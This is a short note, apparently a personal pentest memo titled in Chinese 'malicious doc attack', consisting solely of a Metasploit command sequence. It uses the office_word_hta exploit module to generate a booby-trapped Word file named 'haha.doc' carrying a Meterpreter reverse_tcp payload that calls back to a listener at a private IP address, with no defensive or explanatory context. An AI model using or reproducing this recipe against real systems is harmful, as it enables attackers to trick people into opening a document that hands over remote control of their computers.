# 恶意doc攻击

```go
use exploit/windows/fileformat/office_word_hta
set payload windows/meterpreter/reverse_tcp
set FILENAME haha.doc
set SRVHOST 192.168.119.175 
set LHOST 192.168.119.175 
run
```
